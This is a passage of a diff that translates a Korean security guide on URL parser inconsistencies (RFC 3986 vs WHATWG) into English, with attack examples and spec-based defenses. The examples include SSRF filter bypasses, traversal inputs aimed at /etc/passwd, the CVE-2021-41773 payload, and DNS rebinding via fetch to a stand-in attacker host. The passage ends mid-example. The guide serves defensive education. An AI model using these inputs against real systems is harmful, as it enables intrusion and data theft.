-**스펙 기반 방어**:
-- **RFC 3986 §3.2.2**: Host는 `[` 또는 `]`로 둘러싸인 IP-literal이거나, IPv4 주소이거나, registered name
-- **실무 권장**:
-  - 언어 표준 라이브러리의 `getHost()` 같은 메서드 신뢰하지 말 것
-  - RFC 3986 기준 명시적 파싱 라이브러리 사용
-  - 호스트 추출 후 IP 주소로 변환하여 재검증
-  - Allow-list 기반 검증 (Deny-list는 우회 가능)
+**Spec-Based Defense**:
+- **RFC 3986 §3.2.2**: Host is either IP-literal enclosed in `[` or `]`, IPv4 address, or registered name
+- **Practical Recommendations**:
+  - Don't trust language standard library methods like `getHost()`
+  - Use explicit parsing libraries based on RFC 3986
+  - Re-validate after converting host to IP address
+  - Allow-list based validation (deny-lists are bypassable)
 
 ---
 
-### 9. URL 인코딩 처리 불일치 (RFC 3986 §2.1)
+### 9. URL Encoding Processing Inconsistencies (RFC 3986 §2.1)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §2.1**: *"A percent-encoded octet is encoded as a character triplet, consisting of the percent character '%' followed by the two hexadecimal digits representing that octet's numeric value."*
-- **RFC 3986 §2.4**: Unreserved 문자 집합 정의
+- **RFC 3986 §2.4**: Defines unreserved character set
 
-**보안적 함의**:
-구현체마다 URL 디코딩 시점과 횟수가 다름:
-1. **디코딩 시점**: 입력 검증 전 vs 후
-2. **재귀 디코딩**: 1회 vs 반복적으로 디코딩
-3. **대소문자**: `%2E` vs `%2e` 처리
+**Security Implications**:
+Different implementations vary in URL decoding timing and frequency:
+1. **Decoding timing**: Before vs after input validation
+2. **Recursive decoding**: Once vs repeatedly
+3. **Case sensitivity**: `%2E` vs `%2e` handling
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시: 재귀 디코딩 차이
-입력: http://example.com/%252e%252e%252f
+Attack Example: Recursive Decoding Differences
+Input: http://example.com/%252e%252e%252f
 
-파서 A (1회 디코딩):
+Parser A (decode once):
 → http://example.com/%2e%2e%2f
-→ 보안 검증: "../" 패턴 없음 → 통과
+→ Security validation: No "../" pattern → Pass
 
-파서 B (재귀 디코딩):
+Parser B (recursive decoding):
 → http://example.com/../
-→ 실제 요청: 디렉토리 순회 성공
+→ Actual request: Directory traversal successful
 ```
 
 ```
-공격 예시: SSRF 필터 우회
-WAF 규칙: "127.0.0.1" 차단
+Attack Example: SSRF Filter Bypass
+WAF rule: Block "127.0.0.1"
 
-입력: http://127.%30.%30.1/admin
+Input: http://127.%30.%30.1/admin
 
-WAF: 문자열 매칭 실패 → 통과
-urllib3/requests: 127.0.0.1로 디코딩 → localhost 접근
+WAF: String matching fails → Pass
+urllib3/requests: Decodes to 127.0.0.1 → localhost access
 ```
 
-**실제 사례**:
-- **Python urllib URL Encoding Confusion**: urllib과 requests가 URL 인코딩된 호스트를 디코딩하여 예기치 않은 127.0.0.1 접근 발생
-- **Axios normalization issue (#7315)**: `https:google.com`을 `https://google.com`으로 자동 수정하여 SSRF 필터 우회
+**Real-World Cases**:
+- **Python urllib URL Encoding Confusion**: urllib and requests decode URL-encoded hosts, causing unexpected 127.0.0.1 access
+- **Axios normalization issue (#7315)**: Auto-corrects `https:google.com` to `https://google.com`, bypassing SSRF filters
 
-**스펙 기반 방어**:
+**Spec-Based Defense**:
 - **RFC 3986 §2.4 MUST**: *"Implementations MUST NOT percent-encode or decode the same string more than once"*
-- **실무 권장**:
-  - 입력 받은 즉시 **정확히 1회** 디코딩 (재귀 금지)
-  - 디코딩 후 정규화 수행
-  - 정규화 후 보안 검증
-  - 검증 통과한 정규화된 URL만 사용
+- **Practical Recommendations**:
+  - Decode **exactly once** immediately upon receiving input (prohibit recursion)
+  - Perform normalization after decoding
+  - Perform security validation after normalization
+  - Use only validated, normalized URLs
 
 ---
 
-### 10. 백슬래시와 슬래시 혼동 (WHATWG vs RFC 3986)
+### 10. Backslash and Slash Confusion (WHATWG vs RFC 3986)
 
-**스펙 원문 동작**:
-- **RFC 3986**: 백슬래시(`\`)를 특별히 다루지 않음 (일반 문자)
-- **WHATWG URL Standard**: 특정 scheme (http, https 등)에서 백슬래시를 슬래시로 정규화
+**Spec Behavior**:
+- **RFC 3986**: Doesn't specifically handle backslash (`\`) (treated as regular character)
+- **WHATWG URL Standard**: Normalizes backslashes to slashes for certain schemes (http, https, etc.)
 
-**보안적 함의**:
-Windows 기반 시스템과 Unix 기반 시스템이 백슬래시를 다르게 처리하며, 일부 브라우저는 백슬래시를 슬래시로 자동 변환한다.
+**Security Implications**:
+Windows-based systems and Unix-based systems handle backslashes differently, and some browsers automatically convert backslashes to slashes.
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시 1: 프로토콜 혼동
-입력: http:\\evil.com\path
+Attack Example 1: Protocol Confusion
+Input: http:\\evil.com\path
 
-Windows/WHATWG 파서: \를 /로 변환
+Windows/WHATWG parser: Converts \ to /
 → http://evil.com/path
 
-Unix 엄격 파서: \는 일반 문자
-→ 호스트 부분을 다르게 파싱
+Unix strict parser: \ is regular character
+→ Parses host portion differently
 
-보안 필터 (Unix): 호스트 = ???
-실제 요청 (Windows): 호스트 = evil.com
+Security filter (Unix): host = ???
+Actual request (Windows): host = evil.com
 ```
 
 ```
-공격 예시 2: Apache Confusion Attack (CVE-2024-38473)
-Apache의 일부 모듈이 filename 필드를 URL로 취급
-백슬래시를 이용하여:
-→ DocumentRoot 탈출
-→ NTLM 인증 강제 (UNC 경로)
+Attack Example 2: Apache Confusion Attack (CVE-2024-38473)
+Some Apache modules treat filename field as URL
+Using backslashes:
+→ Escape DocumentRoot
+→ Force NTLM authentication (UNC path)
 → SSRF → NTLM Relay → RCE
 ```
 
-**실제 사례**:
-- **Orange Tsai, Black Hat USA 2024**: Apache HTTP Server에서 백슬래시 혼동을 이용한 다양한 공격 벡터 발표
-- **CVE-2024-38473, CVE-2024-38476**: Apache 2.4.60에서 패치
+**Real-World Cases**:
+- **Orange Tsai, Black Hat USA 2024**: Presented various attack vectors exploiting backslash confusion in Apache HTTP Server
+- **CVE-2024-38473, CVE-2024-38476**: Patched in Apache 2.4.60
 
-**스펙 기반 방어**:
-- **WHATWG**: 특정 scheme에서 백슬래시를 슬래시로 정규화 (명시적 정의)
-- **실무 권장**:
-  - 백슬래시 포함된 URL 거부 또는 명시적 정규화
-  - 파일시스템 경로와 URL 명확히 구분
-  - 플랫폼 간 일관성 보장 (동일 파서 사용)
+**Spec-Based Defense**:
+- **WHATWG**: Normalizes backslashes to slashes for certain schemes (explicit definition)
+- **Practical Recommendations**:
+  - Reject URLs containing backslashes or establish explicit normalization policy
+  - Clearly distinguish between filesystem paths and URLs
+  - Ensure cross-platform consistency (use same parser)
 
 ---
 
-### 11. 탭과 개행 문자 처리 불일치 (WHATWG §4.1)
+### 11. Tab and Newline Character Processing Inconsistencies (WHATWG §4.1)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **WHATWG URL Standard §4.1**: *"The URL parser removes all leading and trailing C0 controls and space from the input string. It also removes all tab and newline characters from the input string."*
-- **RFC 3986**: 탭과 개행 문자를 명시적으로 다루지 않음 (percent-encode 필요)
+- **RFC 3986**: Doesn't explicitly handle tabs and newlines (percent-encoding required)
 
-**보안적 함의**:
-WHATWG 파서는 탭(`\t`)과 개행(`\n`, `\r`)을 자동으로 **제거**하여 파싱을 계속하지만, RFC 3986 엄격 파서는 이를 오류로 처리할 수 있다.
+**Security Implications**:
+WHATWG parsers automatically **remove** tabs (`\t`) and newlines (`\n`, `\r`) to continue parsing, while RFC 3986 strict parsers may treat these as errors.
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시: 탭/개행 주입으로 필터 우회
-입력: http://tru\nsted.com@evil.com/
+Attack Example: Filter Bypass via Tab/Newline Injection
+Input: http://tru\nsted.com@evil.com/
 
-보안 필터 (문자열 매칭):
-→ "trusted.com"을 찾음 → 허용
+Security filter (string matching):
+→ Finds "trusted.com" → Allow
 
-WHATWG 파서 (브라우저):
-→ \n 제거 → http://trusted.com@evil.com/
+WHATWG parser (browser):
+→ Removes \n → http://trusted.com@evil.com/
 → userinfo = "trusted.com", host = "evil.com"
-→ evil.com 접근
+→ Accesses evil.com
 ```
 
 ```
-공격 예시: HTTP Request Smuggling 연계
+Attack Example: HTTP Request Smuggling Linkage
 GET /path HTTP/1.1\r\n
 Host: trusted.com@evil.com\r\n\r\n
 
-일부 파서: Host 헤더를 그대로 파싱
-WHATWG 호환 파서: @evil.com만 호스트로 인식
-→ Request smuggling 또는 cache poisoning
+Some parsers: Parse Host header as-is
+WHATWG-compatible parser: Recognizes only @evil.com as host
+→ Request smuggling or cache poisoning
 ```
 
-**실제 사례**:
-- **PortSwigger Research, Black Hat 2024**: 탭/개행 제거를 이용한 Cache Key Confusion 공격 발표
-- Nginx behind Cloudflare, Apache behind CloudFront에서 기본 설정으로 재현 가능
+**Real-World Cases**:
+- **PortSwigger Research, Black Hat 2024**: Presented Cache Key Confusion attacks exploiting tab/newline removal
+- Reproducible with default configuration in Nginx behind Cloudflare, Apache behind CloudFront
 
-**스펙 기반 방어**:
-- **WHATWG 명시적 규칙**: C0 제어 문자와 공백 제거
-- **실무 권장**:
-  - 입력 URL에서 탭/개행 문자 발견 시 **즉시 거부** (자동 제거 금지)
-  - HTTP 헤더 파싱과 URL 파싱 일관성 보장
-  - 정규 표현식 매칭 시 `\s` (공백 문자 클래스) 주의
+**Spec-Based Defense**:
+- **WHATWG explicit rule**: Remove C0 control characters and spaces
+- **Practical Recommendations**:
+  - **Immediately reject** when tab/newline characters found in input URLs (prohibit auto-removal)
+  - Ensure consistency between HTTP header parsing and URL parsing
+  - Be cautious with `\s` (whitespace character class) in regex matching
 
 ---
 
-## 제3부: 정규화와 비교의 보안적 함의
+## Part 3: Security Implications of Normalization and Comparison
 
-### 12. Case Normalization의 범위 (RFC 3986 §6.2.2.1)
+### 12. Scope of Case Normalization (RFC 3986 §6.2.2.1)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §6.2.2.1**: *"The scheme and host are case-insensitive and therefore should be normalized to lowercase. For example, the URI 'HTTP://www.EXAMPLE.com/' is equivalent to 'http://www.example.com/'."*
-- **경로는 대소문자 구분**: Path 컴포넌트는 case-sensitive
+- **Path is case-sensitive**: Path component is case-sensitive
 
-**보안적 함의**:
-정규화 범위를 잘못 적용하면 보안 검증 우회:
-1. Scheme/host만 소문자 변환
-2. Path는 그대로 유지해야 함
+**Security Implications**:
+Incorrect application of normalization scope leads to security validation bypass:
+1. Only scheme/host should be converted to lowercase
+2. Path should be preserved as-is
 
-**공격 벡터**:
-
-```
-공격 예시 1: 대소문자를 이용한 경로 순회
-보안 규칙: "/admin" 경로 차단
-
-입력: http://example.com/Admin
-→ 대소문자 구분하지 않는 필터: 통과
-→ 대소문자 구분하는 서버: /Admin != /admin → 접근 허용
-
-또는 반대:
-입력: http://example.com/admin
-→ 대소문자 구분하는 필터: 차단
-→ 대소문자 구분하지 않는 서버 (Windows IIS): /admin == /Admin → 접근
-```
+**Attack Vectors**:
 
 ```
-공격 예시 2: IDN Homograph Attack 연계
-입력: http://EXАMPLE.com/  (Cyrillic А)
+Attack Example 1: Path Traversal Using Case Differences
+Security rule: Block "/admin" path
 
-소문자 변환 후: http://exаmple.com/
-→ 유니코드 정규화와 함께 사용 시 도메인 스푸핑
+Input: http://example.com/Admin
+→ Case-insensitive filter: Pass
+→ Case-sensitive server: /Admin != /admin → Access allowed
+
+Or vice versa:
+Input: http://example.com/admin
+→ Case-sensitive filter: Block
+→ Case-insensitive server (Windows IIS): /admin == /Admin → Access
 ```
 
-**실제 사례**:
-- **IIS vs Apache 대소문자 처리 차이**: Windows IIS는 경로를 대소문자 구분하지 않지만, Apache/Nginx는 구분하여 parser differential 발생
-- 많은 WAF가 경로를 소문자 변환하여 검사하지만, 실제 서버는 대소문자 구분하여 우회 가능
+```
+Attack Example 2: Linkage with IDN Homograph Attack
+Input: http://EXАMPLE.com/  (Cyrillic А)
 
-**스펙 기반 방어**:
-- **RFC 3986 §6.2.2.1**: Scheme과 host만 대소문자 정규화
-- **실무 권장**:
-  - 보안 검증 시 서버의 대소문자 처리 방식 일치시킴
-  - Windows 서버: 경로도 소문자 변환 후 검증
-  - Unix 서버: 대소문자 그대로 검증
-  - IDN (Internationalized Domain Name) 사용 시 Punycode 변환 후 검증
+After lowercase conversion: http://exаmple.com/
+→ Domain spoofing when used with Unicode normalization
+```
+
+**Real-World Cases**:
+- **IIS vs Apache Case Handling Differences**: Windows IIS doesn't distinguish path case, but Apache/Nginx does, causing parser differential
+- Many WAFs convert paths to lowercase for checking, but actual servers distinguish case, enabling bypass
+
+**Spec-Based Defense**:
+- **RFC 3986 §6.2.2.1**: Normalize case only for scheme and host
+- **Practical Recommendations**:
+  - Align security validation with server's case handling
+  - Windows servers: Convert paths to lowercase for validation too
+  - Unix servers: Validate case as-is
+  - Convert to Punycode before validation when using IDN (Internationalized Domain Name)
 
 ---
 
-### 13. Percent-Encoding 정규화 (RFC 3986 §6.2.2.2)
+### 13. Percent-Encoding Normalization (RFC 3986 §6.2.2.2)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §6.2.2.2**: *"URIs that differ in the replacement of an unreserved character with its corresponding percent-encoded US-ASCII octet are equivalent."*
-- **Unreserved 문자**: `A-Z a-z 0-9 - . _ ~`
-- **정규화 규칙**: Unreserved 문자의 인코딩은 디코딩해야 함
+- **Unreserved characters**: `A-Z a-z 0-9 - . _ ~`
+- **Normalization rule**: Encoding of unreserved characters should be decoded
 
-**보안적 함의**:
-정규화되지 않은 URL과 정규화된 URL을 다른 엔티티로 취급하면:
-1. 중복 캐시 엔트리 생성
-2. 보안 정책 우회
-3. 동일 리소스에 대한 접근 제어 불일치
+**Security Implications**:
+Treating non-normalized and normalized URLs as different entities leads to:
+1. Duplicate cache entries
+2. Security policy bypass
+3. Access control inconsistencies for the same resource
 
-**공격 벡터**:
-
-```
-공격 예시 1: 캐시 키 혼동 (Cache Key Confusion)
-원본: http://example.com/api/users
-변형: http://example.com/api/%75sers  (%75 = 'u')
-
-CDN 캐시: 서로 다른 키로 취급 → 중복 캐시
-→ Cache poisoning 시 정규화된 버전만 독성화
-→ 사용자가 비정규화 URL 접근 시 독성 캐시 제공
-```
+**Attack Vectors**:
 
 ```
-공격 예시 2: 접근 제어 우회
-ACL 규칙: "/admin" 차단
+Attack Example 1: Cache Key Confusion
+Original: http://example.com/api/users
+Variant: http://example.com/api/%75sers  (%75 = 'u')
 
-입력: /%61dmin  (%61 = 'a')
-→ ACL: 문자열 매칭 실패 → 통과
-→ 서버: 디코딩 후 /admin 처리 → 접근 성공
+CDN cache: Treated as different keys → Duplicate cache
+→ When cache poisoning, only normalized version poisoned
+→ Users accessing non-normalized URL served poisoned cache
 ```
 
 ```
-공격 예시 3: 중복 리소스 생성
+Attack Example 2: Access Control Bypass
+ACL rule: Block "/admin"
+
+Input: /%61dmin  (%61 = 'a')
+→ ACL: String matching fails → Pass
+→ Server: Processes as /admin after decoding → Access successful
+```
+
+```
+Attack Example 3: Duplicate Resource Creation
 POST /api/users HTTP/1.1
 {"id": "user1"}
 
 POST /api/%75sers HTTP/1.1
 {"id": "user1"}
 
-비정규화 API: 서로 다른 엔드포인트로 취급 → 중복 생성 또는 로직 오류
+Non-normalizing API: Treated as different endpoints → Duplicate creation or logic errors
 ```
 
-**실제 사례**:
-- **PortSwigger Black Hat 2024**: Cache Key Confusion을 이용하여 Nginx/Cloudflare, Apache/CloudFront에서 XSS 및 기밀 정보 노출 데모
-- **CVE-2021-41773** (Apache): Percent-encoding된 경로 순회 문자가 정규화되지 않아 인증 우회
+**Real-World Cases**:
+- **PortSwigger Black Hat 2024**: Demonstrated XSS and confidential information disclosure on Nginx/Cloudflare, Apache/CloudFront using Cache Key Confusion
+- **CVE-2021-41773** (Apache): Percent-encoded path traversal characters not normalized, leading to authentication bypass
 
-**스펙 기반 방어**:
-- **RFC 3986 §6.2.2.2**: Unreserved 문자는 인코딩 해제해야 함
+**Spec-Based Defense**:
+- **RFC 3986 §6.2.2.2**: Unreserved characters should be decoded
 - **RFC 3986 §6.2.2**: *"For consistency, URI producers and normalizers should use uppercase hexadecimal digits for all percent-encodings."*
-- **실무 권장**:
-  - 입력 받은 즉시 정규화 (unreserved 디코딩)
-  - Uppercase hex digit 강제 (%2E, not %2e)
-  - 정규화된 형태로 캐시 키, ACL 검사, 데이터베이스 저장
-  - 동일 URL의 다양한 표현을 canonical form으로 통일
+- **Practical Recommendations**:
+  - Normalize immediately upon receiving input (decode unreserved)
+  - Enforce uppercase hex digits (%2E, not %2e)
+  - Use normalized form for cache keys, ACL checks, database storage
+  - Unify various representations of the same URL to canonical form
 
 ---
 
-### 14. 경로 세그먼트 정규화 (RFC 3986 §6.2.2.3)
+### 14. Path Segment Normalization (RFC 3986 §6.2.2.3)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §6.2.2.3**: *"The '..' and '.' segments are removed from a URL path by applying the 'remove_dot_segments' algorithm."*
-- **알고리즘**:
-  - `.`는 현재 디렉토리 (제거)
-  - `..`는 상위 디렉토리 (이전 세그먼트 제거)
+- **Algorithm**:
+  - `.` is current directory (remove)
+  - `..` is parent directory (remove previous segment)
 
-**보안적 함의**:
-경로 순회 공격의 핵심 메커니즘. 정규화 시점과 방법에 따라 보안 결과가 달라진다.
+**Security Implications**:
+Core mechanism of path traversal attacks. Security outcomes vary based on normalization timing and method.
 
-**공격 벡터**:
-
-```
-공격 예시 1: 기본 경로 순회
-입력: /api/../../../etc/passwd
-
-정규화 전 검증: "../" 패턴 발견 → 차단
-정규화 후 검증: /etc/passwd → 허용 또는 차단
-
-정규화 전 요청 전송: /api/../../../etc/passwd → 서버가 정규화 → /etc/passwd 접근
-```
+**Attack Vectors**:
 
 ```
-공격 예시 2: 인코딩 연계
-입력: /api/%2e%2e/%2e%2e/etc/passwd
+Attack Example 1: Basic Path Traversal
+Input: /api/../../../etc/passwd
 
-정규화 순서 1 (잘못됨):
-1. 경로 정규화: "/api/%2e%2e/%2e%2e/etc/passwd" (변화 없음)
+Validation before normalization: "../" pattern found → Block
+Validation after normalization: /etc/passwd → Allow or block
+
+Sending request before normalization: /api/../../../etc/passwd → Server normalizes → /etc/passwd access
+```
+
+```
+Attack Example 2: Encoding Linkage
+Input: /api/%2e%2e/%2e%2e/etc/passwd
+
+Normalization Order 1 (Wrong):
+1. Path normalization: "/api/%2e%2e/%2e%2e/etc/passwd" (no change)
 2. Percent-decode: "/api/../../etc/passwd"
-3. 경로 순회 성공
+3. Path traversal successful
 
-정규화 순서 2 (올바름):
+Normalization Order 2 (Correct):
 1. Percent-decode: "/api/../../etc/passwd"
-2. 경로 정규화: "/etc/passwd"
-3. 보안 검증: DocumentRoot 밖 → 차단
+2. Path normalization: "/etc/passwd"
+3. Security validation: Outside DocumentRoot → Block
 ```
 
 ```
-공격 예시 3: 경로 정규화 우회 (CVE-2021-41773)
-Apache 2.4.49 경로 정규화 변경:
+Attack Example 3: Path Normalization Bypass (CVE-2021-41773)
+Apache 2.4.49 path normalization change:
 
-입력: /.%2e/etc/passwd
+Input: /.%2e/etc/passwd
 
-이전 버전: 정규화 → /../etc/passwd → /etc/passwd
-2.4.49: /.%2e/를 정규화하지 않음 → 그대로 통과 → 경로 순회 성공
+Previous version: Normalized → /../etc/passwd → /etc/passwd
+2.4.49: Doesn't normalize /.%2e/ → Passes as-is → Path traversal successful
 ```
 
-**실제 사례**:
-- **CVE-2021-41773, CVE-2021-42013** (Apache 2.4.49, 2.4.50): 경로 정규화 로직 변경으로 경로 순회 취약점 발생
-- **Nginx proxy_pass URL 정규화 위험**: `proxy_pass http://backend/..;` 같은 설정 시 의도하지 않은 경로 접근
+**Real-World Cases**:
+- **CVE-2021-41773, CVE-2021-42013** (Apache 2.4.49, 2.4.50): Path traversal vulnerability due to path normalization logic changes
+- **Nginx proxy_pass URL Normalization Risk**: Unintended path access with configurations like `proxy_pass http://backend/..;`
 
-**스펙 기반 방어**:
-- **RFC 3986 §6.2.2.3**: `remove_dot_segments` 알고리즘 정의
+**Spec-Based Defense**:
+- **RFC 3986 §6.2.2.3**: Defines `remove_dot_segments` algorithm
   ```
-  1. Input buffer에서 경로 읽기
-  2. "../" 또는 "./" 접두사 제거
+  1. Read path from input buffer
+  2. Remove "../" or "./" prefixes
   3. "/./" → "/"
-  4. "/../" → "/" (이전 세그먼트도 제거)
-  5. 반복
+  4. "/../" → "/" (also remove previous segment)
+  5. Repeat
   ```
-- **실무 권장**:
-  - **Decode → Normalize → Validate** 순서 엄수
-  - 정규화 후 절대 경로가 DocumentRoot 내부인지 검증
-  - Symlink 고려 (`realpath()` 사용)
-  - `../` 패턴 검사는 디코딩+정규화 후 수행
+- **Practical Recommendations**:
+  - Strictly follow **Decode → Normalize → Validate** order
+  - Verify that absolute path after normalization is inside DocumentRoot
+  - Consider symlinks (use `realpath()`)
+  - Perform `../` pattern checks after decoding + normalization
 
 ---
 
-### 15. 기본 포트 생략 정규화 (RFC 3986 §6.2.3)
+### 15. Default Port Omission Normalization (RFC 3986 §6.2.3)
 
-**스펙 원문 동작**:
+**Spec Behavior**:
 - **RFC 3986 §6.2.3**: *"The default port for a given scheme may be omitted from the authority component, as described in Section 3.2.3."*
-- 예: `http://example.com:80/` ≡ `http://example.com/`
+- Example: `http://example.com:80/` ≡ `http://example.com/`
 
-**보안적 함의**:
-포트 번호 포함 여부로 인해 동일 리소스에 대한 다른 표현이 생성되며, 이를 일관되게 처리하지 않으면 보안 정책 우회 가능.
+**Security Implications**:
+Different representations of the same resource created due to port number inclusion/omission, enabling security policy bypass if not handled consistently.
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시 1: Allow-list 우회
+Attack Example 1: Allow-list Bypass
 Allow-list: "https://trusted.com/"
 
-입력: https://trusted.com:443/redirect?to=evil.com
+Input: https://trusted.com:443/redirect?to=evil.com
 
-검증: 문자열 매칭 실패 (포트 번호 포함) → 차단
-BUT 정규화 후: https://trusted.com/redirect?to=evil.com
-→ 동일 리소스이지만 정책 불일치
+Validation: String matching fails (includes port number) → Block
+BUT after normalization: https://trusted.com/redirect?to=evil.com
+→ Same resource but policy inconsistency
 ```
 
 ```
-공격 예시 2: CORS 정책 우회
+Attack Example 2: CORS Policy Bypass
 CORS Allow-Origin: https://app.example.com
 
-요청: Origin: https://app.example.com:443
-→ 브라우저: 정규화하여 일치 판단
-→ 서버: 문자열 매칭으로 불일치 판단
-→ CORS 정책 불일치
+Request: Origin: https://app.example.com:443
+→ Browser: Judges match by normalizing
+→ Server: Judges mismatch by string matching
+→ CORS policy inconsistency
 ```
 
 ```
-공격 예시 3: 캐시 키 중복
-CDN 캐시 키: URL 전체
+Attack Example 3: Cache Key Duplication
+CDN cache key: Full URL
 
 http://example.com/page
 http://example.com:80/page
-→ 서로 다른 캐시 키 → 중복 캐시 엔트리 → 캐시 오염 공격 시 영향 범위 확대
+→ Different cache keys → Duplicate cache entries → Expanded impact range during cache poisoning attacks
 ```
 
-**실제 사례**:
-- 많은 CORS 구현체가 포트 번호 처리를 일관되게 하지 않아 보안 정책 우회 발생
-- CDN 캐시 키 불일치로 인한 cache poisoning 공격 사례 다수
+**Real-World Cases**:
+- Many CORS implementations don't handle port numbers consistently, leading to security policy bypass
+- Numerous cache poisoning attack cases due to CDN cache key inconsistencies
 
-**스펙 기반 방어**:
-- **RFC 3986 §6.2.3**: 기본 포트는 생략 가능하며, 생략된 형태와 명시된 형태는 동등
+**Spec-Based Defense**:
+- **RFC 3986 §6.2.3**: Default port can be omitted, and omitted and explicit forms are equivalent
   - HTTP: 80
   - HTTPS: 443
   - FTP: 21
-- **실무 권장**:
-  - 입력 URL 정규화 시 기본 포트 제거
-  - Allow-list, CORS 정책 등은 정규화된 형태로 저장
-  - 캐시 키는 정규화된 URL 사용
+- **Practical Recommendations**:
+  - Remove default ports when normalizing input URLs
+  - Store allow-lists, CORS policies, etc. in normalized form
+  - Use normalized URLs for cache keys
 
 ---
 
 ### 16. Trailing Dot in Domain (WHATWG vs RFC)
 
-**스펙 원문 동작**:
-- **RFC 3986**: 호스트 이름의 trailing dot에 대한 명확한 규정 없음
-- **WHATWG URL Standard**: `example.com`과 `example.com.`을 **서로 다른 호스트**로 취급
-- **DNS**: Trailing dot은 fully-qualified domain name (FQDN)을 의미
+**Spec Behavior**:
+- **RFC 3986**: No clear specification for trailing dot in hostnames
+- **WHATWG URL Standard**: Treats `example.com` and `example.com.` as **different hosts**
+- **DNS**: Trailing dot signifies fully-qualified domain name (FQDN)
 
-**보안적 함의**:
-Trailing dot 처리 불일치로 인해:
-1. 동일 도메인의 다른 표현 생성
-2. 보안 정책 우회 (CORS, CSP, cookie domain 등)
+**Security Implications**:
+Trailing dot processing inconsistencies lead to:
+1. Different representations of the same domain
+2. Security policy bypass (CORS, CSP, cookie domain, etc.)
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시 1: CORS 우회
+Attack Example 1: CORS Bypass
 CORS Allow-Origin: https://trusted.com
 
-요청: Origin: https://trusted.com.
-→ 일부 브라우저/서버: 동일 도메인으로 취급
-→ WHATWG 엄격 구현: 서로 다른 도메인
-→ 정책 불일치
+Request: Origin: https://trusted.com.
+→ Some browsers/servers: Treat as same domain
+→ WHATWG strict implementation: Different domains
+→ Policy inconsistency
 ```
 
 ```
-공격 예시 2: Cookie 격리 우회
+Attack Example 2: Cookie Isolation Bypass
 Set-Cookie: session=secret; Domain=example.com
 
-요청: https://example.com./
-→ 브라우저마다 쿠키 전송 여부 다름
-→ 쿠키 격리 정책 우회 또는 세션 탈취
+Request: https://example.com./
+→ Browsers vary on whether to send cookie
+→ Cookie isolation policy bypass or session hijacking
 ```
 
 ```
-공격 예시 3: DNS Rebinding
-attacker.com. → A 레코드: 1.2.3.4 (공격자 서버)
+Attack Example 3: DNS Rebinding
+attacker.com. → A record: 1.2.3.4 (attacker server)
 
-피해자 브라우저:
-1. https://attacker.com. 접근 → 1.2.3.4
+Victim browser:
+1. Access https://attacker.com. → 1.2.3.4
 2. JavaScript: fetch('https://attacker.com./internal')
-3. DNS 캐시 만료 후:
-   attacker.com. → A 레코드: 127.0.0.1
-4. 내부 서버 접근
+3. After DNS cache expires:
+   attacker.com. → A record: 127.0.0.1
+4. Access internal server
 ```
 
-**실제 사례**:
-- **WHATWG 명시적 차단**: Trailing dot을 서로 다른 호스트로 취급하여 혼동 방지
-- 일부 CDN/WAF가 trailing dot을 정규화하지 않아 정책 우회 발생
+**Real-World Cases**:
+- **WHATWG Explicit Blocking**: Treats trailing dots as different hosts to prevent confusion
+- Some CDN/WAFs don't normalize trailing dots, enabling policy bypass
 
-**스펙 기반 방어**:
-- **WHATWG 설계 결정**: `example.com` ≠ `example.com.` (명시적 구분)
-- **DNS RFC**: Trailing dot은 FQDN의 정식 표기
-- **실무 권장**:
-  - Trailing dot 발견 시 제거 또는 명시적 거부
-  - CORS, CSP, Cookie Domain 등 보안 정책은 정규화된 도메인 기준
-  - DNS 쿼리 전에 trailing dot 정규화
+**Spec-Based Defense**:
+- **WHATWG design decision**: `example.com` ≠ `example.com.` (explicit distinction)
+- **DNS RFC**: Trailing dot is official notation for FQDN
+- **Practical Recommendations**:
+  - Remove or explicitly reject when trailing dot found
+  - Base security policies like CORS, CSP, Cookie Domain on normalized domains
+  - Normalize trailing dot before DNS query
 
 ---
 
-### 17. 유니코드 정규화와 IDN (RFC 3987, WHATWG §3.3)
+### 17. Unicode Normalization and IDN (RFC 3987, WHATWG §3.3)
 
-**스펝 원문 동작**:
-- **RFC 3987 (IRI)**: Internationalized Resource Identifiers - 유니코드 문자 허용
-- **WHATWG URL Standard §3.3**: Domain to ASCII 변환 (Punycode)
-- **유니코드 정규화**: NFC, NFD, NFKC, NFKD 등 다양한 형식
+**Spec Behavior**:
+- **RFC 3987 (IRI)**: Internationalized Resource Identifiers - Allows Unicode characters
+- **WHATWG URL Standard §3.3**: Domain to ASCII conversion (Punycode)
+- **Unicode normalization**: Various forms like NFC, NFD, NFKC, NFKD
 
-**보안적 함의**:
-유니코드 문자는 시각적으로 유사하거나 정규화 후 동일해질 수 있어 **Homograph Attack** 위험.
+**Security Implications**:
+Unicode characters can be visually similar or become identical after normalization, creating **Homograph Attack** risks.
 
-**공격 벡터**:
+**Attack Vectors**:
 
 ```
-공격 예시 1: IDN Homograph Attack
-공격자 도메인: exаmple.com (Cyrillic 'а' U+0430)
-정상 도메인: example.com (Latin 'a' U+0061)
+Attack Example 1: IDN Homograph Attack
+Attacker domain: exаmple.com (Cyrillic 'а' U+0430)
+Legitimate domain: example.com (Latin 'a' U+0061)
 
 Punycode: xn--exmple-7fd.com
 
-사용자: 시각적으로 구분 불가 → 피싱 사이트 접근
+User: Visually indistinguishable → Accesses phishing site
 ```
 
 ```
-공격 예시 2: 유니코드 정규화 악용 (HostSplit/HostBond)
-특정 유니코드 문자가 정규화 후 empty string:
+Attack Example 2: Unicode Normalization Exploitation (HostSplit/HostBond)
+Certain Unicode characters normalize to empty string:
 U+180E (Mongolian Vowel Separator)
 
-입력: http://trusted\u180e.com@evil.com
-정규화 전: trusted<U+180E>.com (userinfo)
-정규화 후: trusted.com (userinfo 없음)
-→ 보안 필터 우회
+Input: http://trusted\u180e.com@evil.com
+Before normalization: trusted<U+180E>.com (userinfo)
+After normalization: trusted.com (no userinfo)
+→ Security filter bypass
 ```
 
 ```
-공격 예시 3: Zero-Width 문자 삽입
-입력: http://trusted\u200B.com  (Zero-Width Space)
+Attack Example 3: Zero-Width Character Insertion
+Input: http://trusted\u200B.com  (Zero-Width Space)
 
